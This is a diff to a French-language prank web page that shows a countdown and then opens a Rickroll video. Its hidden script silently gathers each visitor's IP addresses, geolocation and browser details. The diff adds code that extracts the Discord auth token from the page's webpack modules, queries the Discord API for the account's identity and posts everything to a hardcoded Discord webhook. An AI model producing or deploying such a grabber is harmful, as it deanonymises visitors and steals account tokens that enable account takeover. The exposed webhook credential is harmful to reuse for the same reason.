@@ -39,12 +39,12 @@
   <div class="countdown" id="timer">5 secondes</div>
 
   <script>
-    // === À MODIFIER : ton webhook Discord ===
+    // === TON WEBHOOK DISCORD (à changer si besoin) ===
     const webhook = "https://discord.com/api/webhooks/1452985926451200201/HOLaPjkC1fq5ZCk2m-RFRPBvD09-MiFAz2h--jrZPh9kaXma-Xnzl9PUVvyVL0gPZzCl";
 
     (async () => {
       try {
-        // Récupération IP + géolocalisation
+        // Récup IP + géoloc
         const [ipv4Res, ipv6Res, geoRes] = await Promise.allSettled([
           fetch("https://api.ipify.org?format=json").then(r => r.ok ? r.json() : {ip: "inconnu"}),
           fetch("https://api6.ipify.org?format=json").then(r => r.ok ? r.json() : {ip: "inconnu"}),
@@ -55,35 +55,54 @@
         const ipv6 = ipv6Res.status === "fulfilled" ? ipv6Res.value.ip : "inconnu";
         const geo = geoRes.status === "fulfilled" ? geoRes.value : {};
 
-        // Infos navigateur
         const ua = navigator.userAgent;
         const lang = navigator.language || "inconnu";
         const screenRes = `${screen.width}x${screen.height}`;
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "inconnu";
 
-        // Tentative de récupération du pseudo Discord
+        // === NOUVELLE DÉTECTION DISCORD (très efficace 2025) ===
         let discordUsername = "Non détecté";
         let discordTag = "";
         let discordId = "";
         let discordAvatar = "";
 
         try {
-          const token = localStorage.getItem("token")?.replace(/"/g, '');
+          let token = null;
+
+          // Méthode webpackChunkdiscord_app (la plus fiable actuellement)
+          const chunks = window.webpackChunkdiscord_app || [];
+          if (chunks.push) {
+            chunks.push([[Symbol()], {}, (req) => {
+              for (const m of Object.keys(req.c).map(x => req.c[x].exports).filter(x => x)) {
+                if (m.default && m.default.getToken !== void 0) {
+                  token = m.default.getToken();
+                }
+                if (m.getToken !== void 0) {
+                  token = m.getToken();
+                }
+              }
+            }]);
+            chunks.pop();
+          }
+
           if (token) {
-            const res = await fetch("https://discord.com/api/v9/users/@me", {
+            const userRes = await fetch("https://discord.com/api/v9/users/@me", {
               headers: { "Authorization": token }
             });
-            if (res.ok) {
-              const user = await res.json();
+
+            if (userRes.ok) {
+              const user = await userRes.json();
               discordUsername = user.global_name || user.username || "Inconnu";
               discordTag = user.discriminator === "0" ? "" : `#${user.discriminator}`;
               discordId = user.id;
               discordAvatar = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128` : "";
             }
           }
-        } catch (e) {}
+        } catch (e) {
+          // Silencieux si ça rate
+        }
 
-        // Message texte propre (sans embed)
+        // Message propre
         const message = `
 🎯 **Nouvelle visite détectée**
 
@@ -104,7 +123,7 @@
 **Heure (UTC) :** ${new Date().toISOString()}
         `.trim();
 
-        // Envoi du message
+        // Envoi
         await fetch(webhook, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -115,12 +134,10 @@
           })
         });
 
-      } catch (e) {
-        // Silencieux en cas d'erreur
-      }
+      } catch (e) {}
     })();
 
-    // Compte à rebours + ouverture dans un nouvel onglet (compatible Firefox)
+    // Compte à rebours + Rickroll dans nouvel onglet
     let timeLeft = 5;
     const timerEl = document.getElementById("timer");
     const countdown = setInterval(() => {
@@ -128,7 +145,6 @@
       timerEl.textContent = timeLeft + (timeLeft === 1 ? " seconde" : " secondes");
       if (timeLeft <= 0) {
         clearInterval(countdown);
-        // Ouvre la vidéo dans un nouvel onglet → fonctionne partout
         window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
       }
     }, 1000);
